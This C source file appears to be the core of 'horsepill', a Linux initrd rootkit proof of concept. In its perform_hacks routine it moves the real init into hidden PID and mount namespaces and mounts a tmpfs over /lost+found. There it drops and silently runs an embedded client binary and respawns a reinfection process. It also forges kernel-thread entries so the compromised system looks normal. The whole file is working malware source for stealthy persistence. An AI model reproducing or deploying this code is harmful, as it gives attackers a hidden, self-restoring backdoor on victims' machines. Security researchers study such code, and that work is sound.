#include "horsepill.h"

#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <signal.h>
#include <dirent.h>

#include "client.h"
#include "infect.h"

#define CLIENT_PATH	"/lost+found/%%CLIENT_BN%%"

#ifndef MS_RELATIME
#define MS_RELATIME	(1<<21)
#endif
#ifndef MS_STRICTATIME
#define MS_STRICTATIME	(1<<24)
#endif
#ifndef CLONE_NEWNS
#define CLONE_NEWNS	0x00020000
#endif
#ifndef CLONE_NEWPID
#define CLONE_NEWPID	0x20000000
#endif

#define YOLO(x) (void)x

#define CLIENTCMDLINE_LEN	64

char client_cmdline[CLIENTCMDLINE_LEN] __attribute__ ((section ("%%SECTION_NAME%%"))) = {
	"%%CLIENT_BN%%\0"
	"%%UUID%%\0\0"
};

pid_t init_pid;

extern pid_t __clone(int, void *);

static inline int raw_clone(unsigned long flags, void *child_stack){
	return __clone(flags, child_stack);
}

static int is_proc(char *name){
	int i;
	for (i = 0; i < strlen(name); i++)
		if (!isdigit(name[i]))
			return 0;
	return 1;
}

static char* grab_kernel_thread(char *name){
	FILE* stat;
	char buf[4096];
	int pid;
	unsigned int i;
	int ppid;
	char pidname[4096];
	char newpidname[4096];
	char state;
	char *ret = NULL;
	memset((void*)newpidname, 0, sizeof(newpidname));
	snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
	stat = fopen(buf, "r");
	if (stat == NULL)
		goto out;
	fgets(buf, sizeof(buf) - 1, stat);
	sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
	if (pid != 1 && (ppid == 0 || ppid == 2)){
		for (i = 0; i <= strlen(pidname); i++) {
			char c = pidname[i];
			if (c == '(')
				c = '[';
			else if (c == ')')
				c = ']';
			newpidname[i] = c;
		}
		ret = strdup(newpidname);
	}
	fclose(stat);
out:
	return ret;
}

static void grab_kernel_threads(char **threads){
	DIR *dirp;
	int i = 0;
	struct dirent *dp;
	if ((dirp = opendir("/proc")) == NULL) {
		exit(EXIT_FAILURE);
	}
	do {
		errno = 0;
		if ((dp = readdir(dirp)) != NULL)
			if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
				char *name = grab_kernel_thread(dp->d_name);
				if (name) {
					threads[i] = name;
					i++;
				}
			}
	} while (dp != NULL);
	if (errno != 0)
		exit(EXIT_FAILURE);
	(void) closedir(dirp);
}

static int setproctitle(char *title){
	static char *proctitle = NULL;
	char buf[2048], *tmp;
	FILE *f;
	int i, len, ret = 0;
	unsigned long start_data, end_data, start_brk, start_code, end_code, start_stack, arg_start, arg_end, env_start, env_end, brk_val;
	struct prctl_mm_map prctl_map;
	f = fopen("/proc/self/stat", "r");
	if(!f)
		return -1;
	tmp = fgets(buf, sizeof(buf), f);
	fclose(f);
	if(!tmp)
		return -1;
	tmp = strchr(buf, ' ');
	for (i = 0; i < 24; i++) {
		if (!tmp)
			return -1;
		tmp = strchr(tmp+1, ' ');
	}
	if (!tmp)
		return -1;
	i = sscanf(tmp, "%lu %lu %lu", &start_code, &end_code, &start_stack);
	if(i != 3)
		return -1;
	for(i = 0; i < 19; i++) {
		if (!tmp)
			return -1;
		tmp = strchr(tmp+1, ' ');
	}
	if(!tmp)
		return -1;
	i = sscanf(tmp, "%lu %lu %lu %lu %lu %lu %lu", &start_data, &end_data, &start_brk, &arg_start, &arg_end, &env_start, &env_end);
	if (i != 7)
		return -1;
	len = strlen(title) + 1;
	if(len > arg_end - arg_start){
		void *m;
		m = realloc(proctitle, len);
		if (!m)
			return -1;
		proctitle = m;
		arg_start = (unsigned long) proctitle;
	}
	arg_end = arg_start + len;
	brk_val = (unsigned long)__brk(0);
	prctl_map = (struct prctl_mm_map) {
		.start_code = start_code,
		.end_code = end_code,
		.start_stack = start_stack,
		.start_data = start_data,
		.end_data = end_data,
		.start_brk = start_brk,
		.brk = brk_val,
		.arg_start = arg_start,
		.arg_end = arg_end,
		.env_start = env_start,
		.env_end = env_end,
		.auxv = NULL,
		.auxv_size = 0,
		.exe_fd = -1,
	};
	ret = prctl(PR_SET_MM, PR_SET_MM_MAP, (long) &prctl_map, sizeof(prctl_map), 0);
	if (ret == 0)
		strcpy((char*)arg_start, title);
	return ret;
}

static void set_prctl_name(char *name){
	char buf[2048];
	memset((void*)buf, 0, sizeof(buf));
	strncpy(buf, name+1, strlen(name)-2);
	if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0)
		exit(EXIT_FAILURE);
}

static void make_kernel_threads(char **threads){
	int i;
	if(fork() == 0) {
		set_prctl_name(threads[0]);
		setproctitle(threads[0]);
		for (i = 1; threads[i]; i++){
			if (fork() == 0) {
				set_prctl_name(threads[i]);
				setproctitle(threads[i]);
				while(1)
					pause();
				exit(EXIT_FAILURE);
			}
			sleep(2);
		}
		while(1)
			pause();
		exit(EXIT_FAILURE);
	}
}

int grab_executable(){
	const char name[] = "/bin/run-init";
	int rc = -1;
	int fd;
	struct stat statbuf;
	int bytes_read;
	fd = open(name, O_RDONLY);
	if (fd < 0)
		goto out;
	if (fstat(fd, &statbuf) < 0)
		goto out_open;
	exe.len = statbuf.st_size;
	exe.buf = (unsigned char *)malloc(exe.len);
	if (exe.buf == NULL)
		goto out_open;
	bytes_read = 0;
	while (bytes_read != exe.len){
		rc = read(fd, (void*)exe.buf + bytes_read, exe.len - bytes_read);
		if (rc < 0)
			goto out_open;
		bytes_read += rc;
		sleep(2);
	}
	rc = 0;
out_open:
	close(fd);
out:
	return rc;
}

int should_backdoor(){
	const char* procs[] = { "/proc/cmdline", "/root/proc/cmdline", NULL };
	static int known = -1;
	int fd;
	int rc;
	char *buf[4096];
	if (known != -1)
		goto out;
	memset((void*)buf, 0, sizeof(buf));
	for (int i = 0; procs[i]; i++){
		fd = open(procs[i], O_RDONLY);
		if (fd < 0)
			continue;
	}
	if (fd < 0){
		sleep(10);
		goto no;
	}
	rc = read(fd, (void*)buf, sizeof(buf));
	close(fd);
	if (rc < 0){
		sleep(10);
		goto no;
	}
yes:
	known = 1;
	goto out;
no:
	known = 0;
out:
	return known;
}

static void write_client(){
	FILE* exe_file = NULL;
	exe_file = fopen(CLIENT_PATH, "w+");
	if (exe_file) {
		(void)fwrite((const void*)client, 1, client_len, exe_file);
		(void)fclose(exe_file);
		(void)chmod(CLIENT_PATH, S_IXUSR | S_IRUSR);
	}
}

static pid_t run_client(){
	pid_t pid;
	int i;
	pid = fork();
	if (pid < 0)
		exit(EXIT_FAILURE);
	else if (pid == 0) {
		char *argv[8];
		int last_null, counter;
		memset((void*)argv, 0, sizeof(argv));
		last_null = 0;
		counter = 0;
		for (i = 0; i < CLIENTCMDLINE_LEN - 1; i++) {
			if (client_cmdline[i] == 0) {
				argv[counter] = &(client_cmdline[last_null+1]);
				if (client_cmdline[i+1] == 0)
					break;
				last_null = i;
				counter++;
			}
			if (counter == 7)
				break;
		}
		close(0);
		close(1);
		close(2);
		YOLO(open("/dev/null", O_RDONLY));
		YOLO(open("/dev/null", O_WRONLY));
		YOLO(open("/dev/null", O_RDWR));
		execv(CLIENT_PATH, argv);
		exit(EXIT_FAILURE);
	}
	return pid;
}

static void handle_init_exit(int status){
	if (WIFSIGNALED(status)) {
		int signum = WTERMSIG(status);
		if (signum == 1) {
			(void)reboot(LINUX_REBOOT_CMD_RESTART, NULL);
			exit(EXIT_FAILURE);
		} else if (signum == 2) {
			YOLO(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
			exit(EXIT_FAILURE);
		} else
			exit(EXIT_FAILURE);
	} else
		exit(EXIT_FAILURE);
	exit(EXIT_FAILURE);
}

static void on_sigint(int signum){
	if (signum == SIGINT)
		kill(init_pid, SIGINT);
}

void perform_hacks(){
	char *kthreads[1024];
	if (!should_backdoor())
		return;
	memset((void*)kthreads, 0, sizeof(kthreads));
	grab_kernel_threads(kthreads);
	init_pid = raw_clone(SIGCHLD | CLONE_NEWPID | CLONE_NEWNS, NULL);
	if (init_pid < 0)
		exit(EXIT_FAILURE);
	else if (init_pid > 0){
		pid_t client_pid, reinfect_pid;
		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
			exit(EXIT_FAILURE);
		sleep(20);
		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME, "errors=remount-ro,data=ordered") < 0)
			exit(EXIT_FAILURE);
		write_client();
		client_pid = run_client();
		reinfect_pid = run_reinfect();
		while(1){
			int status;
			pid_t pid;
			pid = waitpid(-1, &status, 0);
			if (pid < 0)
				if (errno != EINTR)
					exit(EXIT_FAILURE);
				else
					continue;
			else if (pid == init_pid)
				handle_init_exit(status);
			else if (pid == client_pid)
				client_pid = run_client();
			else if (pid == reinfect_pid)
				reinfect_pid = run_reinfect();
			sleep(1);
		}
	} else {
		const int mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
		if (umount("/proc") < 0)
			exit(EXIT_FAILURE);
		if (mount("proc", "/proc", "proc", mountflags, NULL) < 0)
			exit(EXIT_FAILURE);
		make_kernel_threads(kthreads);
	}
}
